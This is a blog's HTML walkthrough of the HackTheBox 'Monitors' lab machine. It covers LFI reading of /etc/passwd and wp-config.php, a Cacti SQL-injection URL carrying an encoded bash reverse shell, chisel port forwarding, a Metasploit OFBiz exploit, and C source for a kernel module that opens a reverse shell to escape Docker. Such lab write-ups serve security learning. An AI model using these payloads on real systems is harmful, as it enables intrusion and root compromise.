@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+  <meta name="generator" content="Jekyll">
+
+  <title>Monitors Writeup [HTB]</title>
+
+  <link rel="stylesheet" href="/css/main.css">
+  
+  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Monitors Writeup [HTB] | 5ubterranean’s Blog</title>
+<meta name="generator" content="Jekyll v4.4.1" />
+<meta property="og:title" content="Monitors Writeup [HTB]" />
+<meta name="author" content="5ubterranean" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Monitors is a Linux based machine that was active since April 24th of 2021 to October 9th, on this machine we will use a Local File inclusion vulnerability to get some credentials and enumerate subdomains available on the machine, with this credentials we will have access to a Cacti instance that is vulnerable to command execution through SQL injection, with that we will get a shell inside the machine, once inside we will see that docker is running and that there is a port binded to it, so using chisel we will port fortward the port to our local machine and find a OFBiz apache instance that is vulnerable to Java deserialization, exploiting this vulnerability we will get access to the docker container as root, finally we will see that this container has the capability sys_modules, which allow us to install kernel modules on the host machine, create a kernel module that will give us a shell, install it and finish with the machine." />
+<meta property="og:description" content="Monitors is a Linux based machine that was active since April 24th of 2021 to October 9th, on this machine we will use a Local File inclusion vulnerability to get some credentials and enumerate subdomains available on the machine, with this credentials we will have access to a Cacti instance that is vulnerable to command execution through SQL injection, with that we will get a shell inside the machine, once inside we will see that docker is running and that there is a port binded to it, so using chisel we will port fortward the port to our local machine and find a OFBiz apache instance that is vulnerable to Java deserialization, exploiting this vulnerability we will get access to the docker container as root, finally we will see that this container has the capability sys_modules, which allow us to install kernel modules on the host machine, create a kernel module that will give us a shell, install it and finish with the machine." />
+<link rel="canonical" href="http://localhost:8000/Monitors" />
+<meta property="og:url" content="http://localhost:8000/Monitors" />
+<meta property="og:site_name" content="5ubterranean’s Blog" />
+<meta property="og:image" content="http://localhost:8000/assets/images/monitors/monitors.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-10-09T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:8000/assets/images/monitors/monitors.png" />
+<meta property="twitter:title" content="Monitors Writeup [HTB]" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"5ubterranean","url":"https://5ubterranean.github.io"},"dateModified":"2021-10-09T00:00:00-05:00","datePublished":"2021-10-09T00:00:00-05:00","description":"Monitors is a Linux based machine that was active since April 24th of 2021 to October 9th, on this machine we will use a Local File inclusion vulnerability to get some credentials and enumerate subdomains available on the machine, with this credentials we will have access to a Cacti instance that is vulnerable to command execution through SQL injection, with that we will get a shell inside the machine, once inside we will see that docker is running and that there is a port binded to it, so using chisel we will port fortward the port to our local machine and find a OFBiz apache instance that is vulnerable to Java deserialization, exploiting this vulnerability we will get access to the docker container as root, finally we will see that this container has the capability sys_modules, which allow us to install kernel modules on the host machine, create a kernel module that will give us a shell, install it and finish with the machine.","headline":"Monitors Writeup [HTB]","image":"http://localhost:8000/assets/images/monitors/monitors.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:8000/Monitors"},"url":"http://localhost:8000/Monitors"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+<body>
+  <div id="wrapper">
+    <header>
+  <div>
+    <a href="/">
+    
+    <h1>5ubterranean@home:~$</h1>
+    </a>
+    <div class="header-links">
+      <a href="/archive"><h2 class="header-link">Archive</h2></a>
+<a href="/tags.html"><h2 class="header-link">Tags</h2></a>
+<a href="/about"><h2 class="header-link">About</h2></a>
+<a href="/atom.xml"><h2 class="header-link">RSS</h2></a>
+    </div>
+  </div>
+</header>
+    <div class="container">
+      <section id="main_content">
+        <article>
+  
+  <img src=/assets/images/monitors/monitors.png/../banner.png>
+  
+  <h2>Monitors Writeup [HTB]</h2>
+  <time datetime="2021-10-09T00:00:00-05:00" class="by-line">09 Oct 2021</time>
+  <p>Monitors is a Linux based machine that was active since April 24th of 2021 to October 9th, on this machine we will use a Local File inclusion vulnerability to get some credentials and enumerate subdomains available on the machine, with this credentials we will have access to a Cacti instance that is vulnerable to command execution through SQL injection, with that we will get a shell inside the machine, once inside we will see that docker is running and that there is a port binded to it, so using chisel we will port fortward the port to our local machine and find a OFBiz apache instance that is vulnerable to Java deserialization, exploiting this vulnerability we will get access to the docker container as root, finally we will see that this container has the capability sys_modules, which allow us to install kernel modules on the host machine, create a kernel module that will give us a shell, install it and finish with the machine.</p>
+
+<h1 id="enumeration"><a href="#header-1"></a>Enumeration</h1>
+
+<p>We start using masscan to find all the available ports and then use nmap to get more information about them.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>masscan <span class="nt">-e</span> tun0 <span class="nt">--rate</span><span class="o">=</span>500 <span class="nt">-p</span> 0-65535 10.10.10.238
+nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p</span> 80,22, <span class="nt">-Pn</span> <span class="nt">-o</span> scan.txt 10.10.10.238
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 ba:cc:cd:81:fc:91:55:f3:f6:a9:1f:4e:e8:be:e5:2e <span class="o">(</span>RSA<span class="o">)</span>
+|   256 69:43:37:6a:18:09:f5:e7:7a:67:b8:18:11:ea:d7:65 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 5d:5e:3f:67:ef:7d:76:23:15:11:4b:53:f8:41:3a:94 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Site doesn<span class="s1">'t have a title (text/html; charset=iso-8859-1).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</span></code></pre></div></div>
+
+<p>There are only two ports open, SSH and a webpage, let’s check the website.</p>
+
+<p><img src="/assets/images/monitors/website.png" alt="" /></p>
+
+<p>We can’t access to the page, it also points us to a email where we can get a domain, let’s add it to our hosts file and open it.</p>
+
+<p><img src="/assets/images/monitors/monitor.png" alt="" /></p>
+
+<p>We get to a page that talks about hardware monitoring, at the bottom of the page we can see that it is running wordpress, so using wpscan we find a plugin.</p>
+
+<p><img src="/assets/images/monitors/plugin.png" alt="" /></p>
+
+<p>We search for vulnerabilities on spritz plugin.</p>
+
+<p><img src="/assets/images/monitors/spritz.png" alt="" /></p>
+
+<p>We find a remote and local file inclusion, to exploit it we have to access to <code class="language-plaintext highlighter-rouge">http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/../../../../etc/passwd</code>, so let’s use it to get the wp-config.php file, to do it we access to <code class="language-plaintext highlighter-rouge">http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=../../../wp-config.php</code>.</p>
+
+<p><img src="/assets/images/monitors/wp-config.png" alt="" /></p>
+
+<p>We found the password of the database, but this isn’t the password of admin user, since we have virtual hosting let’s search if there is any other domain on the machine, on apache the file that defines these domains is located at “/etc/apache2/sites-available/000-default.conf”, so let’s retrieve it.</p>
+
+<p><img src="/assets/images/monitors/sites.png" alt="" /></p>
+
+<p>At the start of that file we get another subdomain, <code class="language-plaintext highlighter-rouge">cacti-admin.monitors.htb</code>, so we add it to our hosts file and access to it.</p>
+
+<p><img src="/assets/images/monitors/cacti.png" alt="" /></p>
+
+<h1 id="gaining-access"><a href="#header-1"></a>Gaining Access</h1>
+
+<p>We got to the login page of a <a href="https://www.cacti.net/">cacti</a> instance, we can login to it with the password that we found earlier, also we see that the version running is 1.2.12, searching about vulnerabilities for it we get to an issue on its <a href="https://github.com/Cacti/cacti/issues/3622">github page</a>, there we see some instructions to get command execution, using burp we send any request to repeater and change the URL to <code class="language-plaintext highlighter-rouge">http://cacti-admin.monitors.htb/cacti/color.php?action=export&amp;header=false&amp;filter=1')+UNION+SELECT+1,username,password,4,5,6,7+from+user_auth;update+settings+set+value='%62%61%73%68%20%2d%63%20%22%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%36%2e%34%32%2f%35%34%33%32%31%20%30%3e%26%31%22;'+where+name='path_php_binary';--+-</code>, and when we access to <code class="language-plaintext highlighter-rouge">http://cacti-admin.monitors.htb/cacti/host.php?action=reindex</code>, our payload <code class="language-plaintext highlighter-rouge">bash -c "bash -i &gt;&amp; /dev/tcp/10.10.16.42/54321 0&gt;&amp;1"</code> wil be executed, if your payload isn’t getting executed you have to logout and login again to get a new cookie, for some reason after some tries the exploit will stop working with the same cookie.</p>
+
+<p><img src="/assets/images/monitors/shell1.png" alt="" /></p>
+
+<h1 id="lateral-movement"><a href="#header-2"></a>Lateral Movement</h1>
+
+<p>We don’t need to do this in order to root the machine, but I’ll show it anyways, exploring the machine we find that we have execution permissions on .backup directory on /home/marcus.</p>
+
+<p><img src="/assets/images/monitors/marcushome.png" alt="" /></p>
+
+<p>This means that there should be a file inside there that we can execute, but we don’t have reading permissions, so there is no way of knowing which files are there, well even though we can’t read the directory, we could still have reading permissions on the files inside there, so let’s use the File Inclusion vulnerability from earlier to bruteforce this directory, some possible extensions that the files could have are sh, php and py, so let’s create a file with those lines and use fuff to find any file inside there, <code class="language-plaintext highlighter-rouge">ffuf -u 'http://monitors.htb/wp-content/plugins/wp-with-spritz/wp.spritz.content.filter.php?url=/home/marcus/.backup/W1.W2' -w ~/tools/SecLists-master/Discovery/Web-Content/raft-small-directories.txt:W1 -w extensions.txt:W2 -fs 0</code>.</p>
+
+<p><img src="/assets/images/monitors/ffuf.png" alt="" /></p>
+
+<p>We found a valid combination, backup.sh, so if we try to read that file we find  a password.</p>
+
+<p><img src="/assets/images/monitors/backup.png" alt="" /></p>
+
+<p>Using this password we can access through SSH as marcus and retrieve user.txt</p>
+
+<p><img src="/assets/images/monitors/shell2.png" alt="" /></p>
+
+<p>Note that extensions are not a must on Linux systems so we should’ve tried to use ffuf without extensions, also if we didn’t have reading permissions we would had to upload the wordlist and make a script that would try to run every file inside that wordlist untill one gets executed, and then looked for a way to get the contents of that file.</p>
+
+<h1 id="docker-access">Docker access</h1>
+
+<p>Checking the processes one calls our attention, <code class="language-plaintext highlighter-rouge">/usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 8443 -container-ip 172.17.0.2 -container-port 8443</code>, so we upload chisel to make a port forwarding, once we have it on the machine we run <code class="language-plaintext highlighter-rouge">chisel_1.7.1_linux_amd64 server -p 1080 --reverse</code> on our machine, and <code class="language-plaintext highlighter-rouge">chisel client 10.10.16.42:1080 R:8443:127.0.0.1:8443</code> on monitors machine, we see that it’s another webserver on this case running tomcat.</p>
+
+<p><img src="/assets/images/monitors/tomcat.png" alt="" /></p>
+
+<p>If we run feroxbuster on this site we get a couple of directories, but all of them redirect us to the same site, an <a href="https://ofbiz.apache.org/">OFBiz</a> login page, also we see that it is running the version 17.12.01, searching about it we find that metasploit has a exploit for this version of OFBiz which exploits a deserialization vulnerability on it, so we start metasploit, set our options, set forceexploit to true, and when we run the exploit we will have a shell inside the container.</p>
+
+<p><img src="/assets/images/monitors/docker.png" alt="" /></p>
+
+<h1 id="privilege-escalationdocker-escape">Privilege Escalation/Docker Escape</h1>
+
+<p>We run capsh and we see something interesting.</p>
+
+<p><img src="/assets/images/monitors/capsh.png" alt="" /></p>
+
+<p>We see that we have cap_sys_module, this would allow us to escape from the container, we find this <a href="https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd">blog</a> that explains it, in short with this capability we can install kernel modules on the host machine, so we have to create two files, one with the c code of the module and a Makefile.</p>
+
+<p>subreverse.c</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;linux/kmod.h&gt;</span><span class="cp">
+#include</span> <span class="cpf">&lt;linux/module.h&gt;</span><span class="cp">
+</span><span class="n">MODULE_LICENSE</span><span class="p">(</span><span class="s">"GPL"</span><span class="p">);</span>
+<span class="n">MODULE_AUTHOR</span><span class="p">(</span><span class="s">"AttackDefense"</span><span class="p">);</span>
+<span class="n">MODULE_DESCRIPTION</span><span class="p">(</span><span class="s">"LKM reverse shell module"</span><span class="p">);</span>
+<span class="n">MODULE_VERSION</span><span class="p">(</span><span class="s">"1.0"</span><span class="p">);</span>
+<span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"/bin/bash"</span><span class="p">,</span><span class="s">"-c"</span><span class="p">,</span><span class="s">"bash -i &gt;&amp; /dev/tcp/10.10.16.42/54322 0&gt;&amp;1"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">};</span>
+<span class="k">static</span> <span class="kt">char</span><span class="o">*</span> <span class="n">envp</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span><span class="s">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span><span class="p">,</span> <span class="nb">NULL</span> <span class="p">};</span>
+<span class="k">static</span> <span class="kt">int</span> <span class="n">__init</span> <span class="nf">reverse_shell_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+<span class="k">return</span> <span class="n">call_usermodehelper</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">,</span> <span class="n">UMH_WAIT_EXEC</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">static</span> <span class="kt">void</span> <span class="n">__exit</span> <span class="nf">reverse_shell_exit</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
+<span class="n">printk</span><span class="p">(</span><span class="n">KERN_INFO</span> <span class="s">"Exiting</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="n">module_init</span><span class="p">(</span><span class="n">reverse_shell_init</span><span class="p">);</span>
+<span class="n">module_exit</span><span class="p">(</span><span class="n">reverse_shell_exit</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>Makefile</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">obj</span><span class="o">-</span><span class="n">m</span> <span class="o">+=</span><span class="n">subreverse</span><span class="p">.</span><span class="n">o</span>
+<span class="n">all</span><span class="o">:</span>
+	<span class="n">make</span> <span class="o">-</span><span class="n">C</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="err">$</span><span class="p">(</span><span class="n">shell</span> <span class="n">uname</span> <span class="o">-</span><span class="n">r</span><span class="p">)</span><span class="o">/</span><span class="n">build</span> <span class="n">M</span><span class="o">=</span><span class="err">$</span><span class="p">(</span><span class="n">PWD</span><span class="p">)</span> <span class="n">modules</span>
+<span class="n">clean</span><span class="o">:</span>
+	<span class="n">make</span> <span class="o">-</span><span class="n">C</span> <span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">modules</span><span class="o">/</span><span class="err">$</span><span class="p">(</span><span class="n">shell</span> <span class="n">uname</span> <span class="o">-</span><span class="n">r</span><span class="p">)</span><span class="o">/</span><span class="n">build</span> <span class="n">M</span><span class="o">=</span><span class="err">$</span><span class="p">(</span><span class="n">PWD</span><span class="p">)</span> <span class="n">clean</span>
+</code></pre></div></div>
+
+<p>We upload those files, and when we run make our kernel module files will be created.</p>
+
+<p><img src="/assets/images/monitors/modfiles.png" alt="" /></p>
+
+<p>To install our module we run “insmod subreverse.ko”, and then we will get a shell as root and finish with the machine.</p>
+
+<p><img src="/assets/images/monitors/root.png" alt="" /></p>
+
+  <div class="tags">
+  <h3>Tags</h3>
+  
+  <a href="/tags.html#hackthebox"> HackTheBox</a> &nbsp;
+  
+  <a href="/tags.html#local-file-inclusion"> Local File Inclusion</a> &nbsp;
+  
+  <a href="/tags.html#docker"> Docker</a> &nbsp;
+  
+  <a href="/tags.html#java-deserialization"> Java deserialization</a> &nbsp;
+  
+  <br />
+  <br />
+  </div>
+  <script src="https://www.hackthebox.eu/badge/68440"></script>
+</article>
+      </section>
+    </div>
+  </div>
+
+   <footer>
+  <a href="https://creativecommons.org/licenses/by-nc/3.0/deed.en_US">
+    <span>
+        <b>5ubterranean</b>
+    </span>
+    
+    <span>© 2025</span>
+  </a>
+</footer>
+
+  
+</body>
+
+</html>
